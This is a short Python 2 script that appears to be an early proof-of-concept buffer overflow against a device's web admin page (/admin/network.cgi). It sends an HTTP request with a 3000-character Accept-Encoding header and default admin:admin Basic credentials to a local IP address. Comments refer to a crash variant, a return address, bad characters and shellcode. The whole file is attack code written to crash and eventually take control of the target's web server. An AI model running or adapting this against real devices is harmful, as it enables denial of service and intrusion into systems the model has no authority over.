import socket
import struct


'''
4138 + XXXX in SoapAction value, right now only working with Exit address as sleep address has bad chars which 

disallows from using regular shellcode directly
'''

buf = "GET /admin/network.cgi?iptype="+"zyw"*2 +" HTTP/1.1\r\n" #test
#buf = "GET /admin/network.cgi?iptype="+"zyw"*10 +" HTTP/1.1\r\n" #crash
buf+="Accept-Encoding: " + "zyw"*1000 + "\r\n"
#buf+= "Host: 192.168.10.30\n"
#buf+="Proxy-Connection: keep-alive\r\n"
buf+="Authorization: Basic YWRtaW46YWRtaW4=\r\n\r\n" #admin admin
#buf+="Cache-Control: max-age=0\r\n"
#buf+="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
#buf+="User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36\r\n"
#buf+="Accept-Encoding: gzip,deflate,sdch\r\n"
#buf+="Accept-Language: en-US,en;q=0.8\r\n"
#buf+="Cookie: uid:1111;\r\n"
#buf+="Content-Length: 13\r\n\r\ntest=test\r\n\r\n"
 
print "[+] sending buffer size", len(buf)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.10.30", 80))
s.send(buf)